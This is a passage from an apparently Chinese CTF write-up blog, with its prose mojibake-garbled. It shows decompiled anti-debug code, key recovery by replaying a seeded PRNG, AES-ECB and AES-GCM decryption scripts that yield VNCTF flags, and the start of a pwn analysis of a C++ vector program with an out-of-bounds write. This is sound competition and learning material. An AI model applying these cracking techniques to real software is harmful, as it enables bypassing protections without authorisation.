å¯†ç„¶åä¸ç»™å®šå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œç›¸åŒå°±å¯¹äº†ï¼Œä½†æ˜¯åœ¨ç”Ÿæˆå¯†é’¥çš„åœ°æ–¹æœ‰é—®é¢˜(å‡½æ•°<code>sub_180001650</code>)ï¼š</p><p>è·å–å¯†é’¥ï¼Œåˆšå¥½16å­—èŠ‚ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210181236752.png" alt="image-20250210181236752"></p><p>ç»§ç»­å¾€ä¸‹ï¼š</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">CurrentProcess = GetCurrentProcess();</span><br><span class="line">  CheckRemoteDebuggerPresent(CurrentProcess, &amp;pbDebuggerPresent);</span><br><span class="line">  <span class="keyword">if</span> ( pbDebuggerPresent )</span><br><span class="line">  &#123;</span><br><span class="line">    v131 = v5;</span><br><span class="line">    v132 = v4;</span><br><span class="line">    v133 = v3;</span><br><span class="line">    v134 = v9;</span><br><span class="line">    v124 = v2;</span><br><span class="line">    v11 = v8;</span><br><span class="line">    v135 = v7;</span><br><span class="line">    v136 = v6;</span><br><span class="line">    v12 = v126;</span><br><span class="line">    v13 = v125;</span><br><span class="line">    v14 = v127;</span><br><span class="line">    LOWORD(v147) = <span class="number">7481</span>;</span><br><span class="line">    *(_DWORD *)Str = <span class="number">964328031</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>i64; <span class="built_in">strlen</span>(Str) &gt; i; ++i )</span><br><span class="line">      Str[i] ^= <span class="number">0x17</span>u;</span><br><span class="line">    sub_1800010B0((<span class="type">char</span> *)<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">    v16 = v14;</span><br><span class="line">    v17 = v138;</span><br><span class="line">    v18 = v12;</span><br><span class="line">    v19 = v136;</span><br><span class="line">    v20 = v128;</span><br><span class="line">    v21 = v135;</span><br><span class="line">    v22 = v11;</span><br><span class="line">    v23 = v124;</span><br><span class="line">    v24 = v134;</span><br><span class="line">    v25 = v133;</span><br><span class="line">    v26 = v132;</span><br><span class="line">    v27 = v131;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v124 = v2 ^ <span class="number">0x17</span>;</span><br><span class="line">    v28 = v3 ^ <span class="number">0x17</span>;</span><br><span class="line">    v29 = v4 ^ <span class="number">0x17</span>;</span><br><span class="line">    v27 = v5 ^ <span class="number">0x17</span>;</span><br><span class="line">    v21 = v7 ^ <span class="number">0x17</span>;</span><br><span class="line">    v22 = v8 ^ <span class="number">0x17</span>;</span><br><span class="line">    v24 = v9 ^ <span class="number">0x17</span>;</span><br><span class="line">    v17 = v138 ^ <span class="number">0x17</span>;</span><br><span class="line">    v13 = v125 ^ <span class="number">0x17</span>;</span><br><span class="line">    v19 = v6 ^ <span class="number">0x17</span>;</span><br><span class="line">    v18 = v126 ^ <span class="number">0x17</span>;</span><br><span class="line">    v20 = v128 ^ <span class="number">0x17</span>;</span><br><span class="line">    LOBYTE(v137) = v137 ^ <span class="number">0x17</span>;</span><br><span class="line">    LOBYTE(v130) = v130 ^ <span class="number">0x17</span>;</span><br><span class="line">    v16 = v127 ^ <span class="number">0x17</span>;</span><br><span class="line">    LOBYTE(v129) = v129 ^ <span class="number">0x17</span>;</span><br><span class="line">    v23 = v124;</span><br><span class="line">    v25 = v28;</span><br><span class="line">    v26 = v29;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div><p>æ£€æµ‹æ˜¯å¦åœ¨è°ƒè¯•çŠ¶æ€ï¼Œæ˜¯çš„è¯å°±è¾“å‡º <code>Hmm.</code>ï¼Œä¸æ˜¯çš„è¯ï¼Œå°±å°†å¯†é’¥ ^0x17ï¼Œç„¶åå†åŠ å¯†ï¼Œä½†æ˜¯å¯†é’¥å…¶å®åœ¨å…¶ä»–åœ°æ–¹è¢«æ”¹å˜äº†ï¼Œè€Œä¸æ˜¯é™æ€å†™åœ¨dataæ®µçš„æ•°æ®ï¼Œæ‰€ä»¥ç›´æ¥çœ‹ <code>byte_18000E1E0â€¦â€¦â€¦â€¦^0x17</code>æ˜¯ä¸å¯¹çš„ï¼Œæˆ‘ä»¬çœ‹åˆ°æ•°æ®ï¼Œç„¶å <code>x</code>æŸ¥çœ‹è¢«è°å¼•ç”¨äº†</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210181705083.png" alt="image-20250210181705083"></p><p>å‘ç°å°±æ˜¯å¼€å¤´è¯´è¿‡çš„ <code> ThreadProc</code>å‡½æ•°ï¼Œè·Ÿè¿›å»çœ‹ï¼Œæ˜¯ä¸€å †éšæœºæ•°ç”Ÿæˆï¼Œç„¶åå¾—åˆ°çš„æ•°æ®ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“éšæœºæ•°ç§å­æ˜¯ä»€ä¹ˆï¼ŒdllåŠ¨è°ƒä¹Ÿä¸å¤ªä¼šï¼Œä½†å…¶å®å¾€å‡½æ•°æœ€ä¸‹é¢çœ‹ï¼Œè¿˜æ˜¯æœ‰ä¸ªä¸€æ ·çš„èŠ±æŒ‡ä»¤</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210182407660.png" alt="image-20250210182407660"></p><p>åŒæ ·çš„çœ‹æ±‡ç¼– nopæ‰retnï¼Œå†çœ‹ä»£ç å°±çŸ¥é“äº†ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210183308175.png" alt="image-20250210183308175"></p><p>é‚£æˆ‘ä»¬å°±å¯ä»¥æ¨¡æ‹Ÿéšæœºæ•°ç”Ÿæˆï¼Œç„¶åå°±å¯ä»¥çŸ¥é“å¯†é’¥æ˜¯å¤šå°‘äº†</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>];</span><br><span class="line">    srand(<span class="number">114514u</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> v = rand();</span><br><span class="line">        key[i] = (v + v / <span class="number">0xff</span>) ^ <span class="number">0x17</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, key[i]); <span class="comment">// 09e5fdeb683175b6b13b840891eb78d2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>ç„¶åç›´æ¥cyberchelfä¸€æŠŠæ¢­</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210183451712.png" alt="image-20250210183451712"></p><p>å†™ä¸ªè„šæœ¬ä¹Ÿè¡Œ</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">hex_key = <span class="string">&quot;09e5fdeb683175b6b13b840891eb78d2&quot;</span></span><br><span class="line">hex_ciphertext = <span class="string">&quot;3d011c190ba090815f672731a89aa47497362167ab2eb4a09418d37d93e646e7&quot;</span></span><br><span class="line"></span><br><span class="line">key = binascii.unhexlify(hex_key)</span><br><span class="line">ciphertext = binascii.unhexlify(hex_ciphertext)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key,AES.MODE_ECB)</span><br><span class="line">decrypted = cipher.decrypt(ciphertext)</span><br><span class="line"><span class="built_in">print</span>(decrypted) <span class="comment"># b&quot;VNCTF&#123;W0w_u_g0t_Fuk0&#x27;s_st4rf1sh&#125;&quot;</span></span><br></pre></td></tr></table></figure></div><h2 id="kotlindroid"><a href="#kotlindroid" class="headerlink" title="kotlindroid"></a>kotlindroid</h2><p>ä¸»è¦éƒ¨åˆ†å¦‚ä¸‹ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210200615961.png" alt="image-20250210200615961"></p><p>å‰é¢çš„keyå¾ˆå¥½è·å¾—ï¼Œkey1^23,key2^8æ‹¼æ¥èµ·æ¥å°±æ˜¯äº†ï¼š<code>atrikeyssyekirta</code></p><p>è·Ÿè¿›checkç»§ç»­çœ‹çœ‹ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210201021225.png" alt="image-20250210201021225"></p><p>å¯ä»¥å‘ç°æ˜¯ AES&#x2F;GCMåŠ å¯†ï¼Œå¯†æ–‡æ˜¯: <code>MTE0NTE0HMuJKLOW1BqCAi2MxpHYjGjpPq82XXQ/jgx5WYrZ2MV53a9xjQVbRaVdRiXFrSn6EcQPzA==</code>,ivæ˜¯<code>114514</code>ï¼Œkeyå°±æ˜¯ä¸Šé¢å¾—åˆ°çš„ï¼Œå…¶ä¸­å‡½æ•°GCMParameterSpecè®¾ç½®äº†tagä¸º128ä½ï¼Œå…¶å®å°±æ˜¯å¯†æ–‡æœ€å16å­—èŠ‚ï¼Œä½†æ˜¯GCMæ¨¡å¼è¿˜éœ€è¦ä¸€ä¸ªaadæ‰å¯ä»¥è§£å¯†ï¼Œä¸‹é¢æ‰¾ä¸€æ‰¾aad:</p><p>å…ˆè·Ÿè¿›secåé¢æœ‰ä¸ª <code>SearchActivityKt$sec$1</code>å‡½æ•°</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210213838529.png" alt="image-20250210213838529"></p><p>å‘ç°ä»JNIç±»è·å¾—äº†bytesæ•°æ®ç„¶åæ›´æ–°ä¸ºAAD</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210223102503.png" alt="image-20250210223102503"></p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210223442143.png" alt="image-20250210223442143"></p><p>è°ƒç”¨äº†soæ–‡ä»¶ä¸­çš„ native_natgetæ–¹æ³•ï¼Œä»é‡Œé¢ä¼ å…¥äº†ä¸Šé¢çš„æ•°ç»„</p><p>ç”±äºæ¯æ¬¡çš„AADéƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¯ä»¥ç›´æ¥fridaæˆ–è€…åŠ¨è°ƒè·å¾—ã€‚è¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹åŠ¨è°ƒå‡ºAAD</p><ul><li>åŠ¨è°ƒ</li></ul><p>ç”¨JEBçš„åŠ¨è°ƒï¼Œå…³äºä¸‹è½½å®‰è£…å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« </p><p><a class="link" href="https://plastic-tire-e58.notion.site/JEB-1a2ca45ea8a480a0b576f249b42306bc?pvs=73">https://plastic-tire-e58.notion.site/JEB-1a2ca45ea8a480a0b576f249b42306bc?pvs=73 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>è¿›å…¥ä¹‹åï¼Œæˆ‘ä»¬æ‰¾åˆ°æ ¸å¿ƒçš„å‡½æ•°ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250222171733987.png" alt="image-20250222171733987"></p><p>ä¹Ÿå°±æ˜¯è¿™é‡Œä¼šæ·»åŠ AADï¼Œæˆ‘ä»¬åœ¨å¼€å¤´å¤„ä¸‹æ–­ç‚¹ï¼Œæ³¨æ„è¦å…ˆtapåˆ°å­—èŠ‚ç çš„é¡µé¢ï¼Œç„¶åæ‰èƒ½ä¸‹æ–­ç‚¹(ctrl+bä¸‹æ–­ç‚¹)</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250222172112212.png" alt="image-20250222172112212"></p><p>åœ¨è¿™é‡Œä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œç„¶åæ­¥è¿‡åˆ°è¿™é‡Œçš„æ—¶å€™è½¬ä¸ºæ­¥å…¥ï¼Œå› ä¸ºè¯¥å¤„æ˜¯nativeå±‚çš„å¤„ç†ï¼Œç›´æ¥æ­¥è¿‡æˆ‘ä»¬æ— æ³•çœ‹åˆ°å…·ä½“çš„æ•°æ®</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250222172357292.png" alt="image-20250222172357292"></p><p>ç„¶åå°±å¯ä»¥çœ‹åˆ°æ•°æ®äº† <code>mysecretadd</code></p><p>ç›´æ¥æ¨¡æ‹Ÿè¯¥é€»è¾‘ç”¨javaå†™ä¸ªä»£ç ç›´æ¥è¾“å‡ºå°±è¡Œï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.GCMParameterSpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AESGCMExample</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// AES GCM è§£å¯†æ–¹æ³•ï¼Œä½¿ç”¨ AAD</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aesGcmDecryptWithAAD</span><span class="params">(<span class="type">byte</span>[] cipherTextWithTag, <span class="type">byte</span>[] key, <span class="type">byte</span>[] iv, <span class="type">byte</span>[] aad)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ä»å¯†æ–‡ä¸­åˆ†ç¦»å‡º tag (æœ€å 16 å­—èŠ‚) å’Œå¯†æ–‡éƒ¨åˆ†</span></span><br><span class="line">        <span class="type">byte</span>[] tag = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆå§‹åŒ–è§£å¯†å™¨</span></span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/GCM/NoPadding&quot;</span>);</span><br><span class="line">        <span class="type">GCMParameterSpec</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GCMParameterSpec</span>(<span class="number">128</span>, iv);  <span class="comment">// 128-bit tag</span></span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE, <span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(key, <span class="string">&quot;AES&quot;</span>), spec);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¾ç½® AAD</span></span><br><span class="line">        cipher.updateAAD(aad);  <span class="comment">// æ·»åŠ  AAD æ•°æ®</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰§è¡Œè§£å¯†</span></span><br><span class="line">        <span class="type">byte</span>[] decryptedData = cipher.doFinal(cipherTextWithTag);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿”å›è§£å¯†åçš„æ˜æ–‡</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(decryptedData, StandardCharsets.UTF_8);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// å‡è®¾çš„å¯†æ–‡ï¼Œå¯†é’¥å’Œ IV</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cipherTextBase64</span> <span class="operator">=</span> <span class="string">&quot;HMuJKLOW1BqCAi2MxpHYjGjpPq82XXQ/jgx5WYrZ2MV53a9xjQVbRaVdRiXFrSn6EcQPzA==&quot;</span>;</span><br><span class="line">            <span class="type">byte</span>[] key = <span class="string">&quot;atrikeyssyekirta&quot;</span>.getBytes();  <span class="comment">// AES å¯†é’¥</span></span><br><span class="line">            <span class="type">byte</span>[] iv = <span class="string">&quot;114514&quot;</span>.getBytes();  <span class="comment">// IV</span></span><br><span class="line">            <span class="type">byte</span>[] cipherTextWithTag = Base64.getDecoder().decode(cipherTextBase64);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å‡è®¾çš„ AAD æ•°æ®</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">aad</span> <span class="operator">=</span> <span class="string">&quot;mysecretadd&quot;</span>;</span><br><span class="line">            <span class="type">byte</span>[] aadBytes = aad.getBytes(StandardCharsets.UTF_8);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è§£å¯†è¿‡ç¨‹</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">decryptedText</span> <span class="operator">=</span> aesGcmDecryptWithAAD(cipherTextWithTag, key, iv, aadBytes);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;è§£å¯†åçš„æ–‡æœ¬: &quot;</span> + decryptedText);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// VNCTF&#123;Y0U_@re_th3_Ma5t3r_0f_C0mp0s3&#125;</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> â€œctf-pwn&quot; - &quot;ctf-re&quot; </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025è¥¿æ¹–è®ºå‰‘wp-éƒ¨åˆ†pwnå’ŒIOT</title>
      <link href="/2025/01/20/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp-%E9%83%A8%E5%88%86pwn%E5%92%8CIOT/"/>
      <url>/2025/01/20/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp-%E9%83%A8%E5%88%86pwn%E5%92%8CIOT/</url>
      
        <content type="html"><![CDATA[<p>è¯šæŒšæ„Ÿè°¢å¤ç°å¹³å°ï¼š<a class="link" href="https://gz.imxbt.cn/">https://gz.imxbt.cn/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="Vpwn"><a href="#Vpwn" class="headerlink" title="Vpwn"></a>Vpwn</h1><p>ä¸€ä¸ªç®€å•çš„C++ pwnï¼Œç”¨æ•°ç»„æ¨¡æ‹Ÿæ ˆçš„åŠŸèƒ½ï¼Œä½†æ˜¯å­˜åœ¨æº¢å‡ºå’Œä»»æ„ä¿®æ”¹ã€‚</p><ul><li>å…ˆçœ‹ä¸€ä¸‹ä¸»ä»£ç ï¼š</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+8h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-64h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  _BYTE v8[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">sub_1840</span>((__int64)v8);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;\nMenu:\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;1. Edit an element in the vector\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;2. Push a new element\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;3. Pop the last element\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;4. Print vector\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;5. Exit\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter your choice: &quot;</span>);</span><br><span class="line">    std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter the index to edit (0-based): &quot;</span>);</span><br><span class="line">        std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;v7);</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter the new value: &quot;</span>);</span><br><span class="line">        std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;v6);</span><br><span class="line">        v3 = v6;</span><br><span class="line">        *(_DWORD *)<span class="built_in">check</span>(v8, v7) = v3;          <span class="comment">// ä¿®æ”¹è¾¹ç•Œé™åˆ¶æ£€æŸ¥</span></span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Element updated successfully.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter the value to push: &quot;</span>);</span><br><span class="line">        std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;v7);</span><br><span class="line">        <span class="built_in">sub_18F4</span>(v8, &amp;v7);</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Element pushed successfully.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">sub_1928</span>(v8);                           <span class="comment">// ä»…å°†æ ‡å¿—ä½è®¾ç½®ä¸º0</span></span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Last element popped successfully.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">sub_19BC</span>(v8);                           <span class="comment">// show</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Exiting program.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Invalid choice! Please enter a valid option.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span 